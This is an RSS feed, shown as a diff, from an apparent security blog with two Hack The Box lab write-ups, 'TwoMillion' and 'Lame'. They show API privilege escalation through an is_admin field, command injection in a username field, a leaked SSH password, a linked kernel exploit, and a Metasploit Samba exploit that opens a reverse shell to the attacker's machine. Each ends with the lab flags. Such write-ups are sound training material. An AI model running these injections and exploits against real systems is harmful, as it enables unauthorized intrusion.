+|_http-trane-info: Problem with XML parsing of /evox/about
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><p><img src="attachment/cebd9713f29652a2953bbac2f2371ed1.png" alt=""></p>
+<h3 id="invite-code-generation">Invite code generation</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HTB<span style="color:#f92672">]</span>
+└─$ curl -X POST <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>  http://2million.htb/api/v1/invite/generate <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>  -H <span style="color:#e6db74">&#39;Content-Type: application/json&#39;</span> <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>  -d <span style="color:#e6db74">&#39;{}&#39;</span>
+<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;0&#34;</span>:200,<span style="color:#e6db74">&#34;success&#34;</span>:1,<span style="color:#e6db74">&#34;data&#34;</span>:<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;code&#34;</span>:<span style="color:#e6db74">&#34;N0VDWEYtQjFWU1UtVDNZSTktMTFMRFc=&#34;</span>,<span style="color:#e6db74">&#34;format&#34;</span>:<span style="color:#e6db74">&#34;encoded&#34;</span><span style="color:#f92672">}}</span>                                                                                                                                    
+┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HTB<span style="color:#f92672">]</span>
+└─$
+┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HTB<span style="color:#f92672">]</span>
+└─$ curl -X POST <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>  http://2million.htb/api/v1/invite/generate <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>  -H <span style="color:#e6db74">&#39;Content-Type: application/json&#39;</span> <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>  -d <span style="color:#e6db74">&#39;{}&#39;</span>
+<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;0&#34;</span>:200,<span style="color:#e6db74">&#34;success&#34;</span>:1,<span style="color:#e6db74">&#34;data&#34;</span>:<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;code&#34;</span>:<span style="color:#e6db74">&#34;SFlKOUUtSDNQU0ItMEhJTFotMDlIVVU=&#34;</span>,<span style="color:#e6db74">&#34;format&#34;</span>:<span style="color:#e6db74">&#34;encoded&#34;</span><span style="color:#f92672">}}</span>                                                                                                                              
+┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HTB<span style="color:#f92672">]</span>
+└─$ echo <span style="color:#e6db74">&#34;SFlKOUUtSDNQU0ItMEhJTFotMDlIVVU=&#34;</span> | base64 -d          
+HYJ9E-H3PSB-0HILZ-09HUU      
+
+</code></pre></div><h3 id="apis">APIs</h3>
+<pre tabindex="0"><code>HTTP/1.1 200 OK
+Server: nginx
+Date: Sun, 11 Aug 2024 12:01:01 GMT
+Content-Type: application/json
+Connection: keep-alive
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 800
+
+{
+  &quot;v1&quot;: {
+    &quot;user&quot;: {
+      &quot;GET&quot;: {
+        &quot;/api/v1&quot;: &quot;Route List&quot;,
+        &quot;/api/v1/invite/how/to/generate&quot;: &quot;Instructions on invite code generation&quot;,
+        &quot;/api/v1/invite/generate&quot;: &quot;Generate invite code&quot;,
+        &quot;/api/v1/invite/verify&quot;: &quot;Verify invite code&quot;,
+        &quot;/api/v1/user/auth&quot;: &quot;Check if user is authenticated&quot;,
+        &quot;/api/v1/user/vpn/generate&quot;: &quot;Generate a new VPN configuration&quot;,
+        &quot;/api/v1/user/vpn/regenerate&quot;: &quot;Regenerate VPN configuration&quot;,
+        &quot;/api/v1/user/vpn/download&quot;: &quot;Download OVPN file&quot;
+      },
+      &quot;POST&quot;: {
+        &quot;/api/v1/user/register&quot;: &quot;Register a new user&quot;,
+        &quot;/api/v1/user/login&quot;: &quot;Login with existing user&quot;
+      }
+    },
+    &quot;admin&quot;: {
+      &quot;GET&quot;: {
+        &quot;/api/v1/admin/auth&quot;: &quot;Check if user is admin&quot;
+      },
+      &quot;POST&quot;: {
+        &quot;/api/v1/admin/vpn/generate&quot;: &quot;Generate VPN for specific user&quot;
+      },
+      &quot;PUT&quot;: {
+        &quot;/api/v1/admin/settings/update&quot;: &quot;Update user settings&quot;
+      }
+    }
+  }
+}
+</code></pre><p><img src="attachment/a230cdbbd7bab9a39b58ad890523fe96.png" alt=""></p>
+<p>Make a PUT request to /api/v1/admin/settings/update with</p>
+<pre tabindex="0"><code>{
+	&quot;email&quot;: &lt;youremail&gt;,
+	&quot;is_admin&quot;: 1
+}
+
+
+</code></pre><pre tabindex="0"><code>POST /api/v1/admin/vpn/generate HTTP/1.1
+Host: 2million.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/json
+Accept-Encoding: gzip, deflate, br
+Referer: http://2million.htb/home
+Connection: keep-alive
+Cookie: PHPSESSID=bgo6jig411fj3nk8bciqfonpdo
+Upgrade-Insecure-Requests: 1
+Content-Length: 47
+
+{
+&quot;username&quot;: &quot;velid; ls -la &quot;
+}
+
+-----------------------------------------------------------------
+HTTP/1.1 200 OK
+Server: nginx
+Date: Sun, 11 Aug 2024 18:21:16 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: keep-alive
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 690
+
+total 56
+drwxr-xr-x 10 root root 4096 Aug 11 18:20 .
+drwxr-xr-x  3 root root 4096 Jun  6  2023 ..
+-rw-r--r--  1 root root   87 Jun  2  2023 .env
+-rw-r--r--  1 root root 1237 Jun  2  2023 Database.php
+-rw-r--r--  1 root root 2787 Jun  2  2023 Router.php
+drwxr-xr-x  5 root root 4096 Aug 11 18:20 VPN
+drwxr-xr-x  2 root root 4096 Jun  6  2023 assets
+drwxr-xr-x  2 root root 4096 Jun  6  2023 controllers
+drwxr-xr-x  5 root root 4096 Jun  6  2023 css
+drwxr-xr-x  2 root root 4096 Jun  6  2023 fonts
+drwxr-xr-x  2 root root 4096 Jun  6  2023 images
+-rw-r--r--  1 root root 2692 Jun  2  2023 index.php
+drwxr-xr-x  3 root root 4096 Jun  6  2023 js
+drwxr-xr-x  2 root root 4096 Jun  6  2023 views
+
+------------------------------------------------------
+
+
+</code></pre><p>Cat the .env file and
+<img src="attachment/76cd033960d09f1f9ebf70f4cbfa5501.png" alt=""></p>
+<p>Log into ssh with credentials</p>
+<pre tabindex="0"><code>ssh admin@10.10.11.221: SuperDuberPass123
+</code></pre><p><img src="attachment/0127d0b1827447c60fa7afec74c2f32b.png" alt=""></p>
+<hr>
+<p>CVE Exploit
+<a href="https://github.com/xkaneiki/CVE-2023-0386">https://github.com/xkaneiki/CVE-2023-0386</a></p>
+<p>This CVE will give you root access</p>
+<p><img src="attachment/3a2cb1f670e1d6bbaa01132a1090bf31.png" alt=""></p>
+<h3 id="flags">Flags</h3>
+<pre tabindex="0"><code>root:7dc68d17b543edb77d35bc192d63907a
+user:f62e9b661ecc6002193860132292c635
+</code></pre>]]></content>
+        </item>
+        
+        <item>
+            <title>HTB: LAME</title>
+            <link>/posts/lame/</link>
+            <pubDate>Sun, 04 Aug 2024 00:00:00 +0000</pubDate>
+            
+            <guid>/posts/lame/</guid>
+            <description>Port Scan Nmap 7.94SVN scan initiated Sat Aug 10 08:35:19 2024 as: nmap -sC -sV -A -T4 -Pn -o scan 10.10.10.3 Nmap scan report for 10.10.10.3 Host is up (0.15s latency). Not shown: 996 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.3.4 |_ftp-anon: Anonymous FTP login allowed (FTP code 230) | ftp-syst: | STAT: | FTP server status: | Connected to 10.10.14.185 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | vsFTPd 2.</description>
+            <content type="html"><![CDATA[<p><img src="attachment/43ebccb6774d75bacfaa80b40cc8e5ce.png" alt=""></p>
+<h3 id="port-scan">Port Scan</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">Nmap 7.94SVN scan initiated Sat Aug <span style="color:#ae81ff">10</span> 08:35:19 <span style="color:#ae81ff">2024</span> as: nmap -sC -sV -A -T4 -Pn -o scan 10.10.10.3
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.3
+Host is up <span style="color:#f92672">(</span>0.15s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">996</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+PORT    STATE SERVICE     VERSION
+21/tcp  open  ftp         vsftpd 2.3.4
+|_ftp-anon: Anonymous FTP login allowed <span style="color:#f92672">(</span>FTP code 230<span style="color:#f92672">)</span>
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to 10.10.14.185
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is <span style="color:#ae81ff">300</span>
+|      Control connection is plain text
+|      Data connections will be plain text
+|      vsFTPd 2.3.4 - secure, fast, stable
+|_End of status
+22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+| ssh-hostkey:
+|   <span style="color:#ae81ff">1024</span> 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd <span style="color:#f92672">(</span>DSA<span style="color:#f92672">)</span>
+|_  <span style="color:#ae81ff">2048</span> 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X <span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
+445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian <span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div><p>Anonymous connection FTP but nothing there</p>
+<h3 id="cve-2007-2447">CVE-2007-2447</h3>
+<p>Looking online i found this vulnerability for this version of smb</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HTB/Lame<span style="color:#f92672">]</span>
+└─$ msfconsole                                                                      
+msf6 &gt; search smb 3.0.20
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No results from search
+msf6 &gt; smb 3.0.20
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Unknown command: smb. Run the help command <span style="color:#66d9ef">for</span> more details.                                                                                                 
+msf6 &gt; search samba 3.0                                                                                                                                          
+                                                                                                                                                                 
+Matching Modules                                                                                                                                                 
+<span style="color:#f92672">================</span>                                                                                                                                                                                                                                                                                                 
+   <span style="color:#75715e">#   Name                                                   Disclosure Date  Rank       Check  Description                                                     </span>
+   -   ----                                                   ---------------  ----       -----  -----------
+   <span style="color:#ae81ff">0</span>   exploit/multi/samba/usermap_script                     2007-05-14       excellent  No     Samba <span style="color:#e6db74">&#34;username map script&#34;</span> Command Execution
+   <span style="color:#ae81ff">1</span>   exploit/linux/samba/chain_reply                        2010-06-16       good       No     Samba chain_reply Memory Corruption <span style="color:#f92672">(</span>Linux x86<span style="color:#f92672">)</span>
+   <span style="color:#ae81ff">2</span>     <span style="color:#ae81ff">\_</span> target: Linux <span style="color:#f92672">(</span>Debian5 3.2.5-4lenny6<span style="color:#f92672">)</span>             .                .          .      .
+   <span style="color:#ae81ff">3</span>     <span style="color:#ae81ff">\_</span> target: Debugging Target                          .                .          .      .
+   <span style="color:#ae81ff">4</span>   exploit/linux/samba/lsa_transnames_heap                2007-05-14       good       Yes    Samba lsa_io_trans_names Heap Overflow
+   <span style="color:#ae81ff">5</span>     <span style="color:#ae81ff">\_</span> target: Linux vsyscall                            .                .          .      .
+   <span style="color:#ae81ff">6</span>     <span style="color:#ae81ff">\_</span> target: Linux Heap Brute Force <span style="color:#f92672">(</span>Debian/Ubuntu<span style="color:#f92672">)</span>    .                .          .      .
+   <span style="color:#ae81ff">7</span>     <span style="color:#ae81ff">\_</span> target: Linux Heap Brute Force <span style="color:#f92672">(</span>Gentoo<span style="color:#f92672">)</span>           .                .          .      .
+   <span style="color:#ae81ff">8</span>     <span style="color:#ae81ff">\_</span> target: Linux Heap Brute Force <span style="color:#f92672">(</span>Mandriva<span style="color:#f92672">)</span>         .                .          .      .
+   <span style="color:#ae81ff">9</span>     <span style="color:#ae81ff">\_</span> target: Linux Heap Brute Force <span style="color:#f92672">(</span>RHEL/CentOS<span style="color:#f92672">)</span>      .                .          .      .
+   <span style="color:#ae81ff">10</span>    <span style="color:#ae81ff">\_</span> target: Linux Heap Brute Force <span style="color:#f92672">(</span>SUSE<span style="color:#f92672">)</span>             .                .          .      .
+   <span style="color:#ae81ff">11</span>    <span style="color:#ae81ff">\_</span> target: Linux Heap Brute Force <span style="color:#f92672">(</span>Slackware<span style="color:#f92672">)</span>        .                .          .      .
+   <span style="color:#ae81ff">12</span>    <span style="color:#ae81ff">\_</span> target: Linux Heap Brute Force <span style="color:#f92672">(</span>OpenWRT MIPS<span style="color:#f92672">)</span>     .                .          .      .
+   <span style="color:#ae81ff">13</span>    <span style="color:#ae81ff">\_</span> target: DEBUG                                     .                .          .      .
+   <span style="color:#ae81ff">14</span>  exploit/osx/samba/lsa_transnames_heap                  2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow
+   <span style="color:#ae81ff">15</span>    <span style="color:#ae81ff">\_</span> target: Automatic                                 .                .          .      .
+   <span style="color:#ae81ff">16</span>    <span style="color:#ae81ff">\_</span> target: Mac OS X 10.4.x x86 Samba 3.0.10          .                .          .      .
+   <span style="color:#ae81ff">17</span>    <span style="color:#ae81ff">\_</span> target: Mac OS X 10.4.x PPC Samba 3.0.10          .                .          .      .
+   <span style="color:#ae81ff">18</span>    <span style="color:#ae81ff">\_</span> target: DEBUG                                     .                .          .      .
+   <span style="color:#ae81ff">19</span>  exploit/solaris/samba/lsa_transnames_heap              2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow
+   <span style="color:#ae81ff">20</span>    <span style="color:#ae81ff">\_</span> target: Solaris 8/9/10 x86 Samba 3.0.21-3.0.24    .                .          .      .
+   <span style="color:#ae81ff">21</span>    <span style="color:#ae81ff">\_</span> target: Solaris 8/9/10 SPARC Samba 3.0.21-3.0.24  .                .          .      .
+   <span style="color:#ae81ff">22</span>    <span style="color:#ae81ff">\_</span> target: DEBUG                                     .                .          .      .
+
+Interact with a module by name or index. For example info 22, use <span style="color:#ae81ff">22</span> or use exploit/solaris/samba/lsa_transnames_heap
+After interacting with a module you can manually set a TARGET with set TARGET <span style="color:#e6db74">&#39;DEBUG&#39;</span>
+msf6 &gt; use exploit/multi/samba/usermap_script 
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> No payload configured, defaulting to cmd/unix/reverse_netcat
+msf6 exploit<span style="color:#f92672">(</span>multi/samba/usermap_script<span style="color:#f92672">)</span> &gt; show options
+Module options <span style="color:#f92672">(</span>exploit/multi/samba/usermap_script<span style="color:#f92672">)</span>:
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   CHOST                     no        The local client address
+   CPORT                     no        The local client port
+   Proxies                   no        A proxy chain of format type:host:port<span style="color:#f92672">[</span>,type:host:port<span style="color:#f92672">][</span>...<span style="color:#f92672">]</span>
+   RHOSTS                    yes       The target host<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>, see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT    <span style="color:#ae81ff">139</span>              yes       The target port <span style="color:#f92672">(</span>TCP<span style="color:#f92672">)</span>
+Payload options <span style="color:#f92672">(</span>cmd/unix/reverse_netcat<span style="color:#f92672">)</span>:
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.163.129  yes       The listen address <span style="color:#f92672">(</span>an interface may be specified<span style="color:#f92672">)</span>
+   LPORT  <span style="color:#ae81ff">4444</span>             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   <span style="color:#ae81ff">0</span>   Automatic
+msf6 exploit<span style="color:#f92672">(</span>multi/samba/usermap_script<span style="color:#f92672">)</span> &gt; set LHOST 10.10.14.185
+LHOST <span style="color:#f92672">=</span>&gt; 10.10.14.185
+msf6 exploit<span style="color:#f92672">(</span>multi/samba/usermap_script<span style="color:#f92672">)</span> &gt; set LPORT <span style="color:#ae81ff">9091</span>
+LPORT <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">9091</span>
+msf6 exploit<span style="color:#f92672">(</span>multi/samba/usermap_script<span style="color:#f92672">)</span> &gt; exploit
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Msf::OptionValidateError One or more options failed to validate: RHOSTS.
+msf6 exploit<span style="color:#f92672">(</span>multi/samba/usermap_script<span style="color:#f92672">)</span> &gt; set RHOST 10.10.10.3
+RHOST <span style="color:#f92672">=</span>&gt; 10.10.10.3
+msf6 exploit<span style="color:#f92672">(</span>multi/samba/usermap_script<span style="color:#f92672">)</span> &gt; set RPORT <span style="color:#ae81ff">139</span>
+RPORT <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">139</span>
+msf6 exploit<span style="color:#f92672">(</span>multi/samba/usermap_script<span style="color:#f92672">)</span> &gt; exploit
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 10.10.14.185:9091 
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Command shell session <span style="color:#ae81ff">1</span> opened <span style="color:#f92672">(</span>10.10.14.185:9091 -&gt; 10.10.10.3:47888<span style="color:#f92672">)</span> at 2024-08-10 09:35:50 -0400
+
+whoami
+root
+cd /root
+ls
+Desktop
+reset_logs.sh
+root.txt
+vnc.log
+cat root.txt
+6118f8816315bd33ecac622d179c65af
+</code></pre></div><p><img src="attachment/95e2ca9714b079079c673225e5a17f15.png" alt=""><img src="attachment/e0218db999901f943bf934f889d0edec.png" alt=""></p>
+<h3 id="flags">Flags</h3>
+<pre tabindex="0"><code>root:6118f8816315bd33ecac622d179c65af
+user:15fd56e82fdefb166bfb1631b6c6360a
+
+</code></pre>]]></content>
+        </item>
+        
+    </channel>
+</rss>
